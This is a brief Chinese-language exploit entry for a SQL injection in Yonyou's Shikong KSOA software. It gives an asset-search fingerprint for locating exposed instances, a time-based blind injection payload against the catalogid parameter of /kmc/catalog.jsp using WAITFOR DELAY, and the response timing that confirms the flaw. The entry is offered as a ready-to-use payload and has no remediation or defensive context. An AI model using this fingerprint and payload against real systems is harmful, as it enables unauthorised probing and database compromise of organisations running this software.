# 用友时空KSOAcatalog存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`

**Payload**
```
/kmc/catalog.jsp?catalogid=';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200 响应时间>=5s